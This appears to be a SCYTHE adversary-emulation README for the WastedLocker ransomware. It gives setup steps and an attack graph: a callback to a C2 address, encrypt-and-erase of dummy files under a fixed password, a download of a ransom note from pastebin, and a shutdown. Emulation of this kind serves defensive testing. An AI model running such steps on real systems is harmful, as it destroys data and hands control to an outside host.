This threat is explained further in SCYTHE's Threat Thursday blog: https://www.scythe.io/library/threatthursday-evil-corp

To Emulate:

1. Download and import the threat in JSON format to your SCYTHE instance - https://github.com/scythe-io/community-threats/blob/master/EvilCorp/WastedLocker_scythe_threat.json
2. Go to the Threat Catalog and select "WastedLocker"
3. Click "Create Campaign from Threat"
4. Name the Campaign
5. Parameters: Replace --cp 35.229.19.7:443 with your SCYTHE instance IP address or FQDN.
6. Launch the Campaign


 #Attack Graph
```mermaid
graph TD
Step0["<b> module: https </b> <br>"]
Step1["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load run </i> <br>"]
Step2["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load file </i> <br>"]
Step3["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load crypt </i> <br>"]
Step4["<b> module: loader </b> <br><h4> parameters: </h4> <i> --load downloader </i> <br>"]
Step5["<b> module: run </b> <br><h4> parameters: </h4> <i> cmd /c mkdir %USERPROFILE%\Desktop\EvilCorp </i> <br><a href='https://attack.mitre.org/techniques/T1059'>att&ck-technique:T1059</a><br>
"]
Step6["<b> module: file </b> <br><h4> parameters: </h4> <i> --create --path %USERPROFILE%\Desktop\EvilCorp\important_files.wasted --size 5MB --count 50 </i> <br><a href='https://attack.mitre.org/techniques/T1078'>att&ck-technique:T1078</a><br>
"]
Step7["<b> module: crypt </b> <br><h4> parameters: </h4> <i> --target %USERPROFILE%\Desktop\EvilCorp\ --encrypt --password 3v1lC0rP --erase --recurse </i> <br><a href='https://attack.mitre.org/techniques/T1486'>att&ck-technique:T1486</a><br>
"]
Step8["<b> module: downloader </b> <br><h4> parameters: </h4> <i> --src https://pastebin.com/raw/ZyVJEYB4 --dest %USERPROFILE%\Desktop\wasted_info.txt </i> <br><a href='https://attack.mitre.org/techniques/T1105'>att&ck-technique:T1105</a><br>
"]
Step9["<b> module: controller </b> <br><h4> parameters: </h4> <i> --shutdown </i> <br><a href='https://attack.mitre.org/tactics/TA0011'>att&ck-tactic:TA0011</a><br>
<a href='https://attack.mitre.org/techniques/T1219'>att&ck-technique:T1219</a><br>
"]
Step0 --> Step1
Step1 --> Step2
Step2 --> Step3
Step3 --> Step4
Step4 --> Step5
Step5 --> Step6
Step6 --> Step7
Step7 --> Step8
Step8 --> Step9
Step9 --> Step10
```
